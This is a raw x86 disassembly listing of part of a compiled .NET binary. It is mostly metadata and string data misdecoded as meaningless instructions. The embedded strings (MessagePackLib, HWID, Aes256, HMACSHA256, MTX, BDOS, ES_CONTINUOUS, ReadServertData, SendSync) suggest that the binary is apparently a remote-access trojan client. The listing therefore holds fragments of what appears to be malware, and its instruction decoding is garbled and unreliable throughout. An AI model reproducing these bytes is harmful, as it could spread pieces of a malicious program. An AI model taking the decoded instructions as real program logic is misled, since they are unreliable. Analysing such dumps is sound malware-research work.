  407643:	00 05 00 01 00 09    	add    %al,0x9000100
  407649:	00 05 00 02 00 0a    	add    %al,0xa000200
  40764f:	00 07                	add    %al,(%edi)
  407651:	00 01                	add    %al,(%ecx)
  407653:	00 0b                	add    %cl,(%ebx)
  407655:	00 07                	add    %al,(%edi)
  407657:	00 02                	add    %al,(%edx)
  407659:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40765c:	09 00                	or     %eax,(%eax)
  40765e:	01 00                	add    %eax,(%eax)
  407660:	0d 00 09 00 02       	or     $0x2000900,%eax
  407665:	00 0e                	add    %cl,(%esi)
  407667:	00 0b                	add    %cl,(%ebx)
  407669:	00 01                	add    %al,(%ecx)
  40766b:	00 0f                	add    %cl,(%edi)
  40766d:	00 0b                	add    %cl,(%ebx)
  40766f:	00 02                	add    %al,(%edx)
  407671:	00 10                	add    %dl,(%eax)
  407673:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407679:	00 0d 00 02 00 12    	add    %cl,0x12000200
  40767f:	00 0f                	add    %cl,(%edi)
  407681:	00 01                	add    %al,(%ecx)
  407683:	00 13                	add    %dl,(%ebx)
  407685:	00 0f                	add    %cl,(%edi)
  407687:	00 02                	add    %al,(%edx)
  407689:	00 14 00             	add    %dl,(%eax,%eax,1)
  40768c:	11 00                	adc    %eax,(%eax)
  40768e:	02 00                	add    (%eax),%al
  407690:	15 00 13 00 01       	adc    $0x1001300,%eax
  407695:	00 16                	add    %dl,(%esi)
  407697:	00 13                	add    %dl,(%ebx)
  407699:	00 02                	add    %al,(%edx)
  40769b:	00 17                	add    %dl,(%edi)
  40769d:	00 15 00 01 00 18    	add    %dl,0x18000100
  4076a3:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a9:	00 17                	add    %dl,(%edi)
  4076ab:	00 01                	add    %al,(%ecx)
  4076ad:	00 1a                	add    %bl,(%edx)
  4076af:	00 17                	add    %dl,(%edi)
  4076b1:	00 02                	add    %al,(%edx)
  4076b3:	00 60 00             	add    %ah,0x0(%eax)
  4076b6:	19 00                	sbb    %eax,(%eax)
  4076b8:	02 00                	add    (%eax),%al
  4076ba:	68 00 1b 00 02       	push   $0x2001b00
  4076bf:	00 69 00             	add    %ch,0x0(%ecx)
  4076c2:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076c7:	00 1f                	add    %bl,(%edi)
  4076c9:	00 01                	add    %al,(%ecx)
  4076cb:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076d2:	8d 00                	lea    (%eax),%eax
  4076d4:	21 00                	and    %eax,(%eax)
  4076d6:	01 00                	add    %eax,(%eax)
  4076d8:	8e 00                	mov    (%eax),%es
  4076da:	21 00                	and    %eax,(%eax)
  4076dc:	02 00                	add    (%eax),%al
  4076de:	8f 00                	pop    (%eax)
  4076e0:	23 00                	and    (%eax),%eax
  4076e2:	01 00                	add    %eax,(%eax)
  4076e4:	90                   	nop
  4076e5:	00 23                	add    %ah,(%ebx)
  4076e7:	00 02                	add    %al,(%edx)
  4076e9:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076ef:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076f5:	00 c0                	add    %al,%al
  4076f7:	00 03                	add    %al,(%ebx)
  4076f9:	00 16                	add    %dl,(%esi)
  4076fb:	00 c2                	add    %al,%dl
  4076fd:	00 05 00 16 00 c4    	add    %al,0xc4001600
  407703:	00 07                	add    %al,(%edi)
  407705:	00 18                	add    %bl,(%eax)
  407707:	00 26                	add    %ah,(%esi)
  407709:	01 09                	add    %ecx,(%ecx)
  40770b:	00 38                	add    %bh,(%eax)
  40770d:	0f 2b 0f             	movntps %xmm1,(%edi)
  407710:	43                   	inc    %ebx
  407711:	0f ef 05 5b 06 75 06 	pxor   0x675065b,%mm0
  407718:	9c                   	pushf
  407719:	06                   	push   %es
  40771a:	ff 06                	incl   (%esi)
  40771c:	27                   	daa
  40771d:	07                   	pop    %es
  40771e:	00 01                	add    %al,(%ecx)
  407720:	71 00                	jno    0x407722
  407722:	16                   	push   %ss
  407723:	1c 01                	sbb    $0x1,%al
  407725:	00 00                	add    %al,(%eax)
  407727:	01 73 00             	add    %esi,0x0(%ebx)
  40772a:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  40772d:	00 00                	add    %al,(%eax)
  40772f:	01 75 00             	add    %esi,0x0(%ebp)
  407732:	f7 05 02 00 41 01 77 	testl  $0x1b170077,0x1410002
  407739:	00 17 1b 
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 79 00             	add    %edi,0x0(%ecx)
  407742:	cb                   	lret
  407743:	08 02                	or     %al,(%edx)
  407745:	00 40 01             	add    %al,0x1(%eax)
  407748:	7b 00                	jnp    0x40774a
  40774a:	94                   	xchg   %eax,%esp
  40774b:	0e                   	push   %cs
  40774c:	03 00                	add    (%eax),%eax
  40774e:	50                   	push   %eax
  40774f:	20 00                	and    %al,(%eax)
  407751:	00 2d 00 70 20 00    	add    %ch,0x207000
  407757:	00 47 00             	add    %al,0x0(%edi)
  40775a:	04 80                	add    $0x80,%al
  40775c:	00 00                	add    %al,(%eax)
  40775e:	01 00                	add    %eax,(%eax)
	...
  40776c:	9b                   	fwait
  40776d:	02 00                	add    (%eax),%al
  40776f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40777a:	00 00                	add    %al,(%eax)
  40777c:	01 00                	add    %eax,(%eax)
  40777e:	c9                   	leave
  40777f:	02 00                	add    (%eax),%al
  407781:	00 00                	add    %al,(%eax)
  407783:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40778e:	00 00                	add    %al,(%eax)
  407790:	01 00                	add    %eax,(%eax)
  407792:	04 10                	add    $0x10,%al
  407794:	00 00                	add    %al,(%eax)
  407796:	00 00                	add    %al,(%eax)
  407798:	04 00                	add    $0x0,%al
	...
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	cc                   	int3
  4077a5:	00 ea                	add    %ch,%dl
  4077a7:	0c 00                	or     $0x0,%al
  4077a9:	00 00                	add    %al,(%eax)
  4077ab:	00 04 00             	add    %al,(%eax,%eax,1)
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	00 00                	add    %al,(%eax)
  4077b2:	00 00                	add    %al,(%eax)
  4077b4:	70 00                	jo     0x4077b6
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	01 00                	add    %eax,(%eax)
  4077ba:	53                   	push   %ebx
  4077bb:	08 00                	or     %al,(%eax)
  4077bd:	00 00                	add    %al,(%eax)
  4077bf:	00 0a                	add    %cl,(%edx)
	...
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 cc                	add    %cl,%ah
  4077cd:	00 ed                	add    %ch,%ch
  4077cf:	02 00                	add    (%eax),%al
  4077d1:	00 00                	add    %al,(%eax)
  4077d3:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	cc                   	int3
  4077e1:	00 95 1a 00 00 00    	add    %dl,0x1a(%ebp)
  4077e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	01 00                	add    %eax,(%eax)
  4077f6:	bc 17 00 00 00       	mov    $0x17,%esp
  4077fb:	00 04 00             	add    %al,(%eax,%eax,1)
  4077fe:	00 00                	add    %al,(%eax)
  407800:	00 00                	add    %al,(%eax)
  407802:	00 00                	add    %al,(%eax)
  407804:	70 00                	jo     0x407806
  407806:	00 00                	add    %al,(%eax)
  407808:	cc                   	int3
  407809:	00 ab 12 00 00 00    	add    %ch,0x12(%ebx)
  40780f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407812:	0b 00                	or     (%eax),%eax
  407814:	10 00                	adc    %al,(%eax)
  407816:	0f 00 14 00          	lldt   (%eax,%eax,1)
  40781a:	13 00                	adc    (%eax),%eax
  40781c:	1e                   	push   %ds
  40781d:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  407823:	06                   	push   %es
  407824:	00 41 63             	add    %al,0x63(%ecx)
  407827:	74 69                	je     0x407892
  407829:	6f                   	outsl  %ds:(%esi),(%dx)
  40782a:	6e                   	outsb  %ds:(%esi),(%dx)
  40782b:	60                   	pusha
  40782c:	31 30                	xor    %esi,(%eax)
  40782e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407831:	70 5f                	jo     0x407892
  407833:	5f                   	pop    %edi
  407834:	30 00                	xor    %al,(%eax)
  407836:	49                   	dec    %ecx
  407837:	45                   	inc    %ebp
  407838:	6e                   	outsb  %ds:(%esi),(%dx)
  407839:	75 6d                	jne    0x4078a8
  40783b:	65 72 61             	gs jb  0x40789f
  40783e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407842:	31 00                	xor    %eax,(%eax)
  407844:	43                   	inc    %ebx
  407845:	61                   	popa
  407846:	6c                   	insb   (%dx),%es:(%edi)
  407847:	6c                   	insb   (%dx),%es:(%edi)
  407848:	53                   	push   %ebx
  407849:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407850:	69 
  407851:	73 74                	jae    0x4078c7
  407853:	60                   	pusha
  407854:	31 00                	xor    %eax,(%eax)
  407856:	61                   	popa
  407857:	31 00                	xor    %eax,(%eax)
  407859:	76 31                	jbe    0x40788c
  40785b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40785e:	53                   	push   %ebx
  40785f:	74 61                	je     0x4078c2
  407861:	74 69                	je     0x4078cc
  407863:	63 41 72             	arpl   %eax,0x72(%ecx)
  407866:	72 61                	jb     0x4078c9
  407868:	79 49                	jns    0x4078b3
  40786a:	6e                   	outsb  %ds:(%esi),(%dx)
  40786b:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407872:	69 
  407873:	7a 65                	jp     0x4078da
  407875:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  40787a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407881:	74 2e                	je     0x4078b1
  407883:	57                   	push   %edi
  407884:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40788b:	55                   	push   %ebp
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	49                   	dec    %ecx
  407895:	6e                   	outsb  %ds:(%esi),(%dx)
  407896:	74 33                	je     0x4078cb
  407898:	32 00                	xor    (%eax),%al
  40789a:	53                   	push   %ebx
  40789b:	77 61                	ja     0x4078fe
  40789d:	70 49                	jo     0x4078e8
  40789f:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a0:	74 33                	je     0x4078d5
  4078a2:	32 00                	xor    (%eax),%al
  4078a4:	3c 3e                	cmp    $0x3e,%al
  4078a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a7:	5f                   	pop    %edi
  4078a8:	5f                   	pop    %edi
  4078a9:	32 00                	xor    (%eax),%al
  4078ab:	61                   	popa
  4078ac:	32 00                	xor    (%eax),%al
  4078ae:	58                   	pop    %eax
  4078af:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078b4:	72 74                	jb     0x40792a
  4078b6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078bd:	32 00                	xor    (%eax),%al
  4078bf:	76 32                	jbe    0x4078f3
  4078c1:	00 76 33             	add    %dh,0x33(%esi)
  4078c4:	00 57 72             	add    %dl,0x72(%edi)
  4078c7:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078ce:	36 
  4078cf:	34 00                	xor    $0x0,%al
  4078d1:	54                   	push   %esp
  4078d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d3:	55                   	push   %ebp
  4078d4:	49                   	dec    %ecx
  4078d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d6:	74 36                	je     0x40790e
  4078d8:	34 00                	xor    $0x0,%al
  4078da:	47                   	inc    %edi
  4078db:	65 74 41             	gs je  0x40791f
  4078de:	73 55                	jae    0x407935
  4078e0:	49                   	dec    %ecx
  4078e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e2:	74 36                	je     0x40791a
  4078e4:	34 00                	xor    $0x0,%al
  4078e6:	53                   	push   %ebx
  4078e7:	65 74 41             	gs je  0x40792b
  4078ea:	73 55                	jae    0x407941
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	54                   	push   %esp
  4078f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f4:	49                   	dec    %ecx
  4078f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f6:	74 36                	je     0x40792e
  4078f8:	34 00                	xor    $0x0,%al
  4078fa:	53                   	push   %ebx
  4078fb:	77 61                	ja     0x40795e
  4078fd:	70 49                	jo     0x407948
  4078ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407900:	74 36                	je     0x407938
  407902:	34 00                	xor    $0x0,%al
  407904:	54                   	push   %esp
  407905:	6f                   	outsl  %ds:(%esi),(%dx)
  407906:	55                   	push   %ebp
  407907:	49                   	dec    %ecx
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407910:	6e                   	outsb  %ds:(%esi),(%dx)
  407911:	74 31                	je     0x407944
  407913:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  407917:	61                   	popa
  407918:	70 49                	jo     0x407963
  40791a:	6e                   	outsb  %ds:(%esi),(%dx)
  40791b:	74 31                	je     0x40794e
  40791d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407921:	41                   	inc    %ecx
  407922:	43                   	inc    %ebx
  407923:	53                   	push   %ebx
  407924:	48                   	dec    %eax
  407925:	41                   	inc    %ecx
  407926:	32 35 36 00 53 68    	xor    0x68530036,%dh
  40792c:	61                   	popa
  40792d:	32 35 36 00 41 65    	xor    0x65410036,%dh
  407933:	73 32                	jae    0x407967
  407935:	35 36 00 61 65       	xor    $0x65610036,%eax
  40793a:	73 32                	jae    0x40796e
  40793c:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407941:	53                   	push   %ebx
  407942:	74 61                	je     0x4079a5
  407944:	74 69                	je     0x4079af
  407946:	63 41 72             	arpl   %eax,0x72(%ecx)
  407949:	72 61                	jb     0x4079ac
  40794b:	79 49                	jns    0x407996
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407955:	69 
  407956:	7a 65                	jp     0x4079bd
  407958:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  40795d:	74 5f                	je     0x4079be
  40795f:	55                   	push   %ebp
  407960:	54                   	push   %esp
  407961:	46                   	inc    %esi
  407962:	38 00                	cmp    %al,(%eax)
  407964:	3c 4d                	cmp    $0x4d,%al
  407966:	6f                   	outsl  %ds:(%esi),(%dx)
  407967:	64 75 6c             	fs jne 0x4079d6
  40796a:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  40796f:	73 73                	jae    0x4079e4
  407971:	61                   	popa
  407972:	67 65 50             	addr16 gs push %eax
  407975:	61                   	popa
  407976:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407979:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407980:	76 61                	jbe    0x4079e3
  407982:	74 65                	je     0x4079e9
  407984:	49                   	dec    %ecx
  407985:	6d                   	insl   (%dx),%es:(%edi)
  407986:	70 6c                	jo     0x4079f4
  407988:	65 6d                	gs insl (%dx),%es:(%edi)
  40798a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40798c:	74 61                	je     0x4079ef
  40798e:	74 69                	je     0x4079f9
  407990:	6f                   	outsl  %ds:(%esi),(%dx)
  407991:	6e                   	outsb  %ds:(%esi),(%dx)
  407992:	44                   	inc    %esp
  407993:	65 74 61             	gs je  0x4079f7
  407996:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40799d:	42 
  40799e:	32 41 31             	xor    0x31(%ecx),%al
  4079a1:	46                   	inc    %esi
  4079a2:	39 39                	cmp    %edi,(%ecx)
  4079a4:	30 32                	xor    %dh,(%edx)
  4079a6:	42                   	inc    %edx
  4079a7:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079ad:	38 30                	cmp    %dh,(%eax)
  4079af:	45                   	inc    %ebp
  4079b0:	46                   	inc    %esi
  4079b1:	31 36                	xor    %esi,(%esi)
  4079b3:	39 32                	cmp    %esi,(%edx)
  4079b5:	43                   	inc    %ebx
  4079b6:	45                   	inc    %ebp
  4079b7:	39 39                	cmp    %edi,(%ecx)
  4079b9:	34 37                	xor    $0x37,%al
  4079bb:	41                   	inc    %ecx
  4079bc:	31 39                	xor    %edi,(%ecx)
  4079be:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079c2:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079c5:	44                   	inc    %esp
  4079c6:	38 46 35             	cmp    %al,0x35(%esi)
  4079c9:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079cd:	41                   	inc    %ecx
  4079ce:	37                   	aaa
  4079cf:	32 31                	xor    (%ecx),%dh
  4079d1:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079d7:	43                   	inc    %ebx
  4079d8:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079dd:	43                   	inc    %ebx
  4079de:	00 45 53             	add    %al,0x53(%ebp)
  4079e1:	5f                   	pop    %edi
  4079e2:	53                   	push   %ebx
  4079e3:	59                   	pop    %ecx
  4079e4:	53                   	push   %ebx
  4079e5:	54                   	push   %esp
  4079e6:	45                   	inc    %ebp
  4079e7:	4d                   	dec    %ebp
  4079e8:	5f                   	pop    %edi
  4079e9:	52                   	push   %edx
  4079ea:	45                   	inc    %ebp
  4079eb:	51                   	push   %ecx
  4079ec:	55                   	push   %ebp
  4079ed:	49                   	dec    %ecx
  4079ee:	52                   	push   %edx
  4079ef:	45                   	inc    %ebp
  4079f0:	44                   	inc    %esp
  4079f1:	00 45 53             	add    %al,0x53(%ebp)
  4079f4:	5f                   	pop    %edi
  4079f5:	44                   	inc    %esp
  4079f6:	49                   	dec    %ecx
  4079f7:	53                   	push   %ebx
  4079f8:	50                   	push   %eax
  4079f9:	4c                   	dec    %esp
  4079fa:	41                   	inc    %ecx
  4079fb:	59                   	pop    %ecx
  4079fc:	5f                   	pop    %edi
  4079fd:	52                   	push   %edx
  4079fe:	45                   	inc    %ebp
  4079ff:	51                   	push   %ecx
  407a00:	55                   	push   %ebp
  407a01:	49                   	dec    %ecx
  407a02:	52                   	push   %edx
  407a03:	45                   	inc    %ebp
  407a04:	44                   	inc    %esp
  407a05:	00 4d 61             	add    %cl,0x61(%ebp)
  407a08:	70 4e                	jo     0x407a58
  407a0a:	61                   	popa
  407a0b:	6d                   	insl   (%dx),%es:(%edi)
  407a0c:	65 54                	gs push %esp
  407a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a0f:	4f                   	dec    %edi
  407a10:	49                   	dec    %ecx
  407a11:	44                   	inc    %esp
  407a12:	00 48 57             	add    %cl,0x57(%eax)
  407a15:	49                   	dec    %ecx
  407a16:	44                   	inc    %esp
  407a17:	00 67 65             	add    %ah,0x65(%edi)
  407a1a:	74 5f                	je     0x407a7b
  407a1c:	46                   	inc    %esi
  407a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1e:	72 6d                	jb     0x407a8d
  407a20:	61                   	popa
  407a21:	74 49                	je     0x407a6c
  407a23:	44                   	inc    %esp
  407a24:	00 45 58             	add    %al,0x58(%ebp)
  407a27:	45                   	inc    %ebp
  407a28:	43                   	inc    %ebx
  407a29:	55                   	push   %ebp
  407a2a:	54                   	push   %esp
  407a2b:	49                   	dec    %ecx
  407a2c:	4f                   	dec    %edi
  407a2d:	4e                   	dec    %esi
  407a2e:	5f                   	pop    %edi
  407a2f:	53                   	push   %ebx
  407a30:	54                   	push   %esp
  407a31:	41                   	inc    %ecx
  407a32:	54                   	push   %esp
  407a33:	45                   	inc    %ebp
  407a34:	00 38                	add    %bh,(%eax)
  407a36:	37                   	aaa
  407a37:	36 33 39             	xor    %ss:(%ecx),%edi
  407a3a:	31 32                	xor    %esi,(%edx)
  407a3c:	36 45                	ss inc %ebp
  407a3e:	41                   	inc    %ecx
  407a3f:	37                   	aaa
  407a40:	37                   	aaa
  407a41:	42                   	inc    %edx
  407a42:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a48:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a4d:	37                   	aaa
  407a4e:	44                   	inc    %esp
  407a4f:	42                   	inc    %edx
  407a50:	41                   	inc    %ecx
  407a51:	36 37                	ss aaa
  407a53:	43                   	inc    %ebx
  407a54:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a59:	46                   	inc    %esi
  407a5a:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a5f:	39 38                	cmp    %edi,(%eax)
  407a61:	38 38                	cmp    %bh,(%eax)
  407a63:	45                   	inc    %ebp
  407a64:	44                   	inc    %esp
  407a65:	30 37                	xor    %dh,(%edi)
  407a67:	30 43 44             	xor    %al,0x44(%ebx)
  407a6a:	34 30                	xor    $0x30,%al
  407a6c:	45                   	inc    %ebp
  407a6d:	31 46 36             	xor    %eax,0x36(%esi)
  407a70:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a76:	67 65 74 5f          	addr16 gs je 0x407ad9
  407a7a:	41                   	inc    %ecx
  407a7b:	53                   	push   %ebx
  407a7c:	43                   	inc    %ebx
  407a7d:	49                   	dec    %ecx
  407a7e:	49                   	dec    %ecx
  407a7f:	00 53 79             	add    %dl,0x79(%ebx)
  407a82:	73 74                	jae    0x407af8
  407a84:	65 6d                	gs insl (%dx),%es:(%edi)
  407a86:	2e 49                	cs dec %ecx
  407a88:	4f                   	dec    %edi
  407a89:	00 49 73             	add    %cl,0x73(%ecx)
  407a8c:	58                   	pop    %eax
  407a8d:	50                   	push   %eax
  407a8e:	00 42 44             	add    %al,0x44(%edx)
  407a91:	4f                   	dec    %edi
  407a92:	53                   	push   %ebx
  407a93:	00 45 53             	add    %al,0x53(%ebp)
  407a96:	5f                   	pop    %edi
  407a97:	43                   	inc    %ebx
  407a98:	4f                   	dec    %edi
  407a99:	4e                   	dec    %esi
  407a9a:	54                   	push   %esp
  407a9b:	49                   	dec    %ecx
  407a9c:	4e                   	dec    %esi
  407a9d:	55                   	push   %ebp
  407a9e:	4f                   	dec    %edi
  407a9f:	55                   	push   %ebp
  407aa0:	53                   	push   %ebx
  407aa1:	00 67 65             	add    %ah,0x65(%edi)
  407aa4:	74 5f                	je     0x407b05
  407aa6:	49                   	dec    %ecx
  407aa7:	56                   	push   %esi
  407aa8:	00 73 65             	add    %dh,0x65(%ebx)
  407aab:	74 5f                	je     0x407b0c
  407aad:	49                   	dec    %ecx
  407aae:	56                   	push   %esi
  407aaf:	00 47 65             	add    %al,0x65(%edi)
  407ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab3:	65 72 61             	gs jb  0x407b17
  407ab6:	74 65                	je     0x407b1d
  407ab8:	49                   	dec    %ecx
  407ab9:	56                   	push   %esi
  407aba:	00 4d 54             	add    %cl,0x54(%ebp)
  407abd:	58                   	pop    %eax
  407abe:	00 30                	add    %dh,(%eax)
  407ac0:	68 6e 62 6e 36       	push   $0x366e626e
  407ac5:	35 45 4c 35 41       	xor    $0x41354c45,%eax
  407aca:	43                   	inc    %ebx
  407acb:	65 35 6e 59 00 76    	gs xor $0x7600596e,%eax
  407ad1:	61                   	popa
  407ad2:	6c                   	insb   (%dx),%es:(%edi)
  407ad3:	75 65                	jne    0x407b3a
  407ad5:	5f                   	pop    %edi
  407ad6:	5f                   	pop    %edi
  407ad7:	00 52 65             	add    %dl,0x65(%edx)
  407ada:	61                   	popa
  407adb:	64 53                	fs push %ebx
  407add:	65 72 76             	gs jb  0x407b56
  407ae0:	65 72 74             	gs jb  0x407b57
  407ae3:	44                   	inc    %esp
  407ae4:	61                   	popa
  407ae5:	74 61                	je     0x407b48
  407ae7:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407aeb:	61                   	popa
  407aec:	00 6d 73             	add    %ch,0x73(%ebp)
  407aef:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407af2:	6c                   	insb   (%dx),%es:(%edi)
  407af3:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407afa:	65 6d                	gs insl (%dx),%es:(%edi)
  407afc:	2e 43                	cs inc %ebx
  407afe:	6f                   	outsl  %ds:(%esi),(%dx)
  407aff:	6c                   	insb   (%dx),%es:(%edi)
  407b00:	6c                   	insb   (%dx),%es:(%edi)
  407b01:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407b06:	6e                   	outsb  %ds:(%esi),(%dx)
  407b07:	73 2e                	jae    0x407b37
  407b09:	47                   	inc    %edi
  407b0a:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b0c:	65 72 69             	gs jb  0x407b78
  407b0f:	63 00                	arpl   %eax,(%eax)
  407b11:	4d                   	dec    %ebp
  407b12:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b19:	74 2e                	je     0x407b49
  407b1b:	56                   	push   %esi
  407b1c:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b23:	73 69                	jae    0x407b8e
  407b25:	63 00                	arpl   %eax,(%eax)
  407b27:	67 65 74 5f          	addr16 gs je 0x407b8a
  407b2b:	53                   	push   %ebx
  407b2c:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b2e:	64 53                	fs push %ebx
  407b30:	79 6e                	jns    0x407ba0
  407b32:	63 00                	arpl   %eax,(%eax)
  407b34:	45                   	inc    %ebp
  407b35:	6e                   	outsb  %ds:(%esi),(%dx)
  407b36:	64 52                	fs push %edx
  407b38:	65 61                	gs popa
  407b3a:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b3e:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b45:	00 
  407b46:	54                   	push   %esp
  407b47:	68 72 65 61 64       	push   $0x64616572
  407b4c:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b50:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b54:	6e                   	outsb  %ds:(%esi),(%dx)
  407b55:	65 72 41             	gs jb  0x407b99
  407b58:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b5d:	41                   	inc    %ecx
  407b5e:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b64:	61                   	popa
  407b65:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b6b:	74 5f                	je     0x407bcc
  407b6d:	43                   	inc    %ebx
  407b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b70:	6e                   	outsb  %ds:(%esi),(%dx)
  407b71:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b76:	00 67 65             	add    %ah,0x65(%edi)
  407b79:	74 5f                	je     0x407bda
  407b7b:	49                   	dec    %ecx
  407b7c:	73 43                	jae    0x407bc1
  407b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b80:	6e                   	outsb  %ds:(%esi),(%dx)
  407b81:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b86:	00 73 65             	add    %dh,0x65(%ebx)
  407b89:	74 5f                	je     0x407bea
  407b8b:	49                   	dec    %ecx
  407b8c:	73 43                	jae    0x407bd1
  407b8e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b8f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b90:	6e                   	outsb  %ds:(%esi),(%dx)
  407b91:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b96:	00 52 65             	add    %dl,0x65(%edx)
  407b99:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b9c:	76 65                	jbe    0x407c03
  407b9e:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407ba2:	74 5f                	je     0x407c03
  407ba4:	47                   	inc    %edi
  407ba5:	75 69                	jne    0x407c10
  407ba7:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407bab:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407bb2:	64 
  407bb3:	53                   	push   %ebx
  407bb4:	79 6e                	jns    0x407c24
  407bb6:	63 3e                	arpl   %edi,(%esi)
  407bb8:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bbc:	61                   	popa
  407bbd:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bc0:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc1:	67 46                	addr16 inc %esi
  407bc3:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bca:	73 43                	jae    0x407c0f
  407bcc:	6f                   	outsl  %ds:(%esi),(%dx)
